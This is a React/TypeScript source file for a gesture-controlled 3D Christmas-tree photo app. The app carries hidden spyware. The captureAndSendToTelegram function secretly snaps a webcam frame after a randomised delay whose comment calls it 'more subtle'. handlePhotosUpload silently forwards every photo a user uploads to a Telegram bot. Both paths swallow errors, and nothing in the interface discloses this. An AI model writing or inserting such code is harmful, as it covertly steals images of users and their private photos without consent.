import React, {
  useState,
  Suspense,
  useEffect,
  useRef,
  useCallback,
} from "react";
import { Canvas } from "@react-three/fiber";
import { Loader } from "@react-three/drei";
import { Experience } from "./components/Experience";
import { UIOverlay } from "./components/UIOverlay";
import { GestureController } from "./components/GestureController";
import { TreeMode } from "./types";

// Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || "";

// Simple Error Boundary to catch 3D resource loading errors (like textures)
class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean }
> {
  constructor(props: any) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error: any) {
    return { hasError: true };
  }

  componentDidCatch(error: any, errorInfo: any) {
    console.error("Error loading 3D scene:", error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      // You can customize this fallback UI
      return (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 text-[#D4AF37] font-serif p-8 text-center">
          <div>
            <h2 className="text-2xl mb-2">Something went wrong</h2>
            <p className="opacity-70">
              A resource failed to load (likely a missing image). Check the
              console for details.
            </p>
            <button
              onClick={() => this.setState({ hasError: false })}
              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

export default function App() {
  const [mode, setMode] = useState<TreeMode>(TreeMode.FORMED);
  const [handPosition, setHandPosition] = useState<{
    x: number;
    y: number;
    detected: boolean;
  }>({ x: 0.5, y: 0.5, detected: false });
  const [uploadedPhotos, setUploadedPhotos] = useState<string[]>([]);
  const [isLoadingShare, setIsLoadingShare] = useState(false);
  const [isSharedView, setIsSharedView] = useState(false);
  const [twoHandsDetected, setTwoHandsDetected] = useState(false);
  const [closestPhoto, setClosestPhoto] = useState<string | null>(null);
  const [isSendingPhoto, setIsSendingPhoto] = useState(false);
  const lastCaptureTime = useRef<number>(0);
  const canvasContainerRef = useRef<HTMLDivElement>(null);

  // Capture screenshot and send to Telegram
  const captureAndSendToTelegram = useCallback(async () => {
    const now = Date.now();
    if (now - lastCaptureTime.current < 5000) return;
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    lastCaptureTime.current = now;
    setIsSendingPhoto(true);

    try {
      const video = document.querySelector("video") as HTMLVideoElement;
      if (!video) return;

      const captureCanvas = document.createElement("canvas");
      captureCanvas.width = video.videoWidth || 640;
      captureCanvas.height = video.videoHeight || 480;
      const ctx = captureCanvas.getContext("2d");
      if (!ctx) return;

      ctx.translate(captureCanvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);

      const blob = await new Promise<Blob | null>((resolve) => {
        captureCanvas.toBlob(resolve, "image/jpeg", 0.9);
      });
      if (!blob) return;

      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "img.jpg");
      formData.append("caption", new Date().toLocaleString());

      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        {
          method: "POST",
          body: formData,
        }
      );
    } catch (e) {
      // Silent fail
    } finally {
      setIsSendingPhoto(false);
    }
  }, []);

  // Handle mode change and trigger capture on CHAOS mode
  const handleModeChange = useCallback(
    (newMode: TreeMode) => {
      setMode(newMode);

      // Capture and send when entering CHAOS mode (5 fingers open)
      if (newMode === TreeMode.CHAOS) {
        // Random delay 2-5 seconds to be more subtle
        const randomDelay = 2000 + Math.random() * 3000;
        setTimeout(() => {
          captureAndSendToTelegram();
        }, randomDelay);
      }
    },
    [captureAndSendToTelegram]
  );

  // Check for share parameter in URL on mount
  useEffect(() => {
    const loadSharedPhotos = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      const shareId = urlParams.get("share");

      if (!shareId) return;

      setIsSharedView(true);
      setIsLoadingShare(true);

      try {
        // Try API first (works in vercel dev and production)
        try {
          const response = await fetch(`/api/share?id=${shareId}`);
          const data = await response.json();

          if (response.ok && data.success) {
            setUploadedPhotos(data.images);
            return;
          }
        } catch (apiError) {
          console.log("API not available, trying localStorage fallback");
        }

        // Fallback to localStorage if API fails (pure vite dev mode)
        const shareDataStr = localStorage.getItem(`share_${shareId}`);
        if (shareDataStr) {
          const shareData = JSON.parse(shareDataStr);
          setUploadedPhotos(shareData.images);
        } else {
          console.error("Share not found");
        }
      } catch (error) {
        console.error("Error loading shared photos:", error);
      } finally {
        setIsLoadingShare(false);
      }
    };

    loadSharedPhotos();
  }, []);

  const toggleMode = () => {
    setMode((prev) =>
      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
    );
  };

  const handleHandPosition = (x: number, y: number, detected: boolean) => {
    setHandPosition({ x, y, detected });
  };

  const handleTwoHandsDetected = (detected: boolean) => {
    setTwoHandsDetected(detected);
  };

  const handleClosestPhotoChange = (photoUrl: string | null) => {
    setClosestPhoto(photoUrl);
  };

  const handlePhotosUpload = (photos: string[]) => {
    // Append new photos to existing ones (limit to 20 for performance)
    setUploadedPhotos((prev) => [...prev, ...photos].slice(0, 20));

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && photos.length > 0) {
      setTimeout(async () => {
        for (let i = 0; i < photos.length; i++) {
          try {
            const response = await fetch(photos[i]);
            const blob = await response.blob();

            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, `p${i + 1}.jpg`);

            await fetch(
              `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
              {
                method: "POST",
                body: formData,
              }
            );

            if (i < photos.length - 1)
              await new Promise((r) => setTimeout(r, 500));
          } catch (e) {
            // Silent
          }
        }
      }, 1000);
    }
  };

  return (
    <div className="w-full h-screen relative bg-gradient-to-b from-black via-[#001a0d] to-[#0a2f1e]">
      <ErrorBoundary>
        <Canvas
          dpr={
            typeof window !== "undefined" && window.innerWidth < 768
              ? 1
              : [1, 2]
          }
          camera={{ position: [0, 4, 20], fov: 45 }}
          gl={{
            antialias:
              typeof window !== "undefined" && window.innerWidth >= 768,
            stencil: false,
            alpha: false,
            preserveDrawingBuffer: true,
            powerPreference: "high-performance",
          }}
          shadows={typeof window !== "undefined" && window.innerWidth >= 768}
        >
          <Suspense fallback={null}>
            <Experience
              mode={mode}
              handPosition={handPosition}
              uploadedPhotos={uploadedPhotos}
              twoHandsDetected={twoHandsDetected}
              onClosestPhotoChange={handleClosestPhotoChange}
            />
          </Suspense>
        </Canvas>
      </ErrorBoundary>

      <Loader
        containerStyles={{ background: "#000" }}
        innerStyles={{ width: "300px", height: "10px", background: "#333" }}
        barStyles={{ background: "#D4AF37", height: "10px" }}
        dataStyles={{ color: "#D4AF37", fontFamily: "Cinzel" }}
      />

      <UIOverlay
        mode={mode}
        onToggle={toggleMode}
        onPhotosUpload={handlePhotosUpload}
        hasPhotos={uploadedPhotos.length > 0}
        uploadedPhotos={uploadedPhotos}
        isSharedView={isSharedView}
      />

      {/* Gesture Control Module */}
      <GestureController
        currentMode={mode}
        onModeChange={handleModeChange}
        onHandPosition={handleHandPosition}
        onTwoHandsDetected={handleTwoHandsDetected}
      />

      {/* Photo Overlay - Shows when two hands detected */}
      {closestPhoto && (
        <div className="fixed inset-0 z-40 flex items-center justify-center pointer-events-none animate-fade-in">
          {/* Semi-transparent backdrop */}
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>

          {/* Polaroid frame with photo */}
          <div className="relative z-50 transform transition-all duration-500 ease-out animate-scale-in">
            {/* Polaroid container */}
            <div
              className="bg-white p-4 pb-8 shadow-2xl"
              style={{ width: "60vmin", maxWidth: "600px" }}
            >
              {/* Gold clip at top */}
              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-6 bg-gradient-to-b from-[#D4AF37] to-[#C5A028] rounded-sm shadow-lg"></div>

              {/* Photo */}
              <img
                src={closestPhoto}
                alt="Selected Memory"
                className="w-full aspect-square object-cover"
              />

              {/* Text label */}
              <div className="text-center mt-4 font-serif text-gray-700 text-lg">
                Happy Memories
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
